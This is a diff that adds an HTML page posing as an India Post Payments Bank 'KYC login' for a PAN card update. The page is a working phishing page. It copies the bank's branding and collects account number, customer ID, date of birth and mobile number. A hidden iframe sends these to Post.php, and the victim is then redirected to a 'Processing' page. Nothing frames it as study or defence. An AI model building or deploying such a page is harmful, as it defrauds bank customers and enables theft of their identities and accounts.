@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,wght@1,500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Karla:wght@200&display=swap" rel="stylesheet">
+    <title> IndiaPost Payment Bank KYC login</title>
+    <style>
+#hh
+        {
+            width: 116%;
+            margin:-8%;
+            margin-left:-5.6%;
+        }
+#ij
+    {
+    width: 30%;
+    margin-left:5px;
+    }
+
+.login-box {
+  width: 90%;
+  padding: 10px;
+}
+
+.login-box .user-box {
+  position: relative;
+}
+
+.login-box .user-box input {
+  width: 90%;
+  padding: 2px 4px;
+  font-size: 16px;
+  color: black;
+  font-weight:bold;
+  margin-bottom: 40px;
+  margin-left:20px;
+  border: none;
+  border-bottom: 1.5px solid #CCCCCC;
+  outline: none;
+  background: transparent;
+  transition: border-color 0.2s;
+}
+.login-box .user-box label {
+  position: absolute;
+  top:-10px;
+  left: 20px;
+  padding: 10px 0px;
+  font-size: 16px;
+  font-family: 'Inter', sans-serif;
+  color: #AF2925;
+  pointer-events: none;
+  transition: 0.2s;
+  font-style:italic;
+  
+}
+.login-box input:focus {
+    width:90%;
+    margin-bottom: 40px;
+    padding: 2px 4px;
+    margin-left:20px;
+    font-size:16px;
+    border-width: 1.5px;
+    border-image: linear-gradient(#AF2924,#AF2925);
+    border-image-slice: 1;
+    
+    }
+
+.login-box .user-box input:focus ~ label,
+.login-box .user-box input:valid ~ label {
+  top: -30px;
+  left: 20px;
+  margin-left:4px;
+  color: #AF2925;
+  font-size: 12px;
+  font-family: 'Inter', sans-serif;
+  font-weight:bold;
+}
+
+#ll
+    {
+    background-color:#AE2924;
+    color: white;
+    margin-left:20px;
+    border: none;
+    outline:none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 15px;
+    font-family: 'Inter', sans-serif;
+    font-weight:bold;
+    width: 90%; height: 40px;
+    }
+    
+    #ll:hover
+    {
+    background-color:#3E1128;
+    color: white;
+    margin-left:20px;
+    border: none;
+    outline:none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 15px;
+    font-family: 'Inter', sans-serif;
+    font-weight:bold;
+    width: 90%; height: 40px;
+    }
+    #kyc
+    {
+    width:116%;   
+    background-color:#3E1128;
+    height:55px;
+    margin:1.2%;
+    margin-left:-5.6%;
+    }
+    .error
+    {
+    position:absolute;
+    top:30%;
+    color: Red;
+    font-family: 'DM Sans', sans-serif;
+    font-size:11px;
+    margin:5px;
+    margin-left:20px;
+    font-style: italic;
+    }
+</style>
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div class="login-box">
+    <!-- Static- Please don't do anything here-->
+    <script type="text/javascript">var submitted=false;</script>
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing.html';}"></iframe>
+    <!--My Form-->
+    <center><img src="indiapost.png" id="hh"></center><br>
+    <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+    <div id="kyc"><br>
+    <b style="font-family: 'Inter', sans-serif; color:white; padding:20px;">CONTINUE TO PAN UPDATE</b><br>
+    </div><br><br>
+    <div class="user-box">
+    <rt>
+      <input type="text" name="Account_No." inputmode="numeric" maxlength="12"
+      required="">
+      <label>Account Number*</label>
+      <tr>
+    </div>
+    <div class="user-box">
+      <input type="text" name="Customer_ID" inputmode="numeric" maxlength="10"
+      required="">
+      <label>Customer ID*</label>
+    </div>
+    <div class="user-box">
+    <table id="tblForm" border="0" cellpadding="5" cellspacing="0">
+    <tr>
+    <input type="text" name="Date_Of_Birth" inputmode="numeric" maxlength="10"
+    required="">
+    <p1><span class="error" style="display: none">Invalid Date Of Birth !</span></p1>
+    <label>Date Of Birth*</label>
+    </tr>
+    </table>
+    <script type="text/javascript">
+    var isShift = false;
+    var seperator = "/";
+    window.onload = function () {
+    //Reference the Table.
+    var tblForm = document.getElementById("tblForm");
+    
+    //Reference all INPUT elements in the Table.
+    var inputs = document.getElementsByTagName("input");
+    
+    //Loop through all INPUT elements.
+    for (var i = 0; i < inputs.length; i++) {
+    //Check whether the INPUT element is TextBox.
+    if (inputs[i].name == "Date_Of_Birth") {
+    //Check whether Date Format Validation is required.
+    if (inputs[i].className.indexOf("date-format") != 1) {
+    
+    //Set Max Length.
+    inputs[i].setAttribute("maxlength", 10);
+    
+    //Only allow Numeric Keys.
+    inputs[i].onkeydown = function (e) {
+    return IsNumeric(this, e.keyCode);
+    };
+    
+    //Validate Date as User types.
+    inputs[i].onkeyup = function (e) {
+    ValidateDateFormat(this, e.keyCode);
+    };
+    }
+    }
+    }
+    };
+    
+    function IsNumeric(input, keyCode) {
+    if (keyCode == 16) {
+    isShift = true;
+    }
+    //Allow only Numeric Keys.
+    if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
+    if ((input.value.length == 2 || input.value.length == 5) && keyCode != 8) {
+    input.value += seperator;
+    }
+    
+    return true;
+    }
+    else {
+    return false;
+    }
+    };
+    
+    function ValidateDateFormat(input, keyCode) {
+    var dateString = input.value;
+    if (keyCode == 16) {
+    isShift = false;
+    }
+    var regex = /(((0|1)[0-9]|2[0-9]|3[0-1])\/(0[1-9]|1[0-2])\/((19|20)\d\d))$/;
+    
+    //Check whether valid dd/MM/yyyy Date Format.
+    if (regex.test(dateString) || dateString.length == 0) {
+    ShowHideError(input, "none");
+    } else {
+    ShowHideError(input, "block");
+    }
+    };
+    
+    function ShowHideError(textbox, display) {
+    var row = textbox.parentNode.parentNode;
+    var errorMsg = row.getElementsByTagName("span")[0];
+    if (errorMsg != null) {
+    errorMsg.style.display = display;
+    }
+    };
+    </script>
+    </div>
+    <div class="user-box">
+    <input type="text" name="Mobile_No." inputmode="numeric" maxlength="10"
+     required="">
+    <label>Mobile Number*</label>
+    </div>
+    <img src="Note_i.jpg" alt="" id="ij"><br>
+    <div class="para">
+    <p style="color:grey; font-family: 'Karla', sans-serif; font-size:12px; margin-left:30px;"><b style="color:black; font-size:12px;">1.</b> Provide your IPPB account details for PAN card update.</p>
+    </div>
+    <div class="para">
+    <p style="color:grey; font-family: 'Karla', sans-serif; font-size:12px; margin-left:30px;"><b style="color:black; font-size:12px;">2.</b>  Mobile number must be registered with IPPB Bank.</p>
+    </div>
+    <center><button type="submit" id="ll">SUBMIT</button></center>
+  </form>
+</div>
+<!-- partial -->
+  
+</body>
+</html>
